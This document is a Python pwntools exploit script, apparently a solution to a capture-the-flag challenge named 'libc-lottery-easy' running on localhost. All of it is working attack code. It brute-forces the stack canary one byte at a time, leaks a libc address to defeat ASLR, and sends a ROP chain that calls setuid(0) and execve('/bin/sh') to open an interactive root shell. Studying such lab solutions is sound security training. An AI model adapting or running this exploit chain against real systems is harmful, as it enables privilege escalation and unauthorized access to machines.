#!/usr/bin/python3

from pwn import *
import re
import time

context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF("/challenge/libc-lottery-easy")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rbp = 0x7ff12345678
ret = rbp + 8
canary_add = rbp - 8
input_start = rbp - 0x20 
offset = canary_add - input_start


def get_canary():
    payload = b"a" * offset + b"\x00"
    for i in range(7):
        for j in range(256):
            try:
                io = remote("127.0.0.1",1337)
                payload += j.to_bytes(1,"little")
                io.send(payload)
                data = io.recvall().decode()
            except:
                data = io.clean(timeout = 0.05).decode()
            finally:
                io.close()
            if "*** stack smashing detected ***" not in  data:
                break
            payload = payload[:-1]
    return int.from_bytes(payload[offset:],"little")

def get_pie(canary):
    payload = b"a" * offset + p64(canary) + b"a"* 8 
    io = remote("127.0.0.1",1337)
    io.send(payload)
    try:
        reg = r"0x[a-f\d]+"
        data = re.findall(reg,io.recvall(timeout=0.5).decode().split('from within this challenge. You will have to do that by yourself.')[1])[1]
        print(data)
    except:
        data = io.clean(timeout = 0.5).decode()
        print("Expected",data)
    finally:
        io.close()
    return int(data,16) - 0x24083

if __name__ == "__main__":
    canary = get_canary()
    libc_base = get_pie(canary)    
    libc.address = libc_base

    rop_elf = ROP(elf)
    rop_libc = ROP(libc)

    pop_rdi = rop_libc.find_gadget(['pop rdi','ret']).address
    pop_rsi = rop_libc.find_gadget(['pop rsi','ret']).address
    pop_rdx = rop_libc.find_gadget(['pop rdx','pop r12','ret']).address
    ret  = rop_libc.find_gadget(['ret']).address

    payload = b"a" * offset + p64(canary) + b"a" * 8
    payload += p64(pop_rdi) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.setuid)
    payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdx) + p64(0) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.execve)

    io = remote('127.0.0.1',1337)
    io.send(payload)
    io.interactive()

